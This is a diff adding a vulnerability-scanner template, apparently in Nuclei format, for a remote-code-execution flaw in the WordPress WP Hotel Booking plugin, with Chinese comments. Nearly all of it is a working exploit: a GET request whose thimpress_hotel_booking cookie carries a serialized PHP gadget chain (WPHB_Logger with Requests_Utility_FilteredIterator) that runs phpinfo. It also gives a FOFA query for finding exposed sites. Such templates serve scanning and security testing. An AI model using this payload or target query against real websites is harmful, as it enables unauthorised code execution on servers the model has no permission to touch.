@@ -1,0 +1,37 @@
+id: poc-soysn6gioig52gg5
+info:
+  name: Wordpress thimpress_hotel_booking RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/soysn6gioig52gg5'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: soysn6gioig52gg5
+    fofa: body="wp-content/plugins/wp-hotel-booking"
+http:
+- raw:
+  - 'GET / HTTP/1.1
+
+
+    Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"phpinfo"%3B}}}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    phpinfo
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
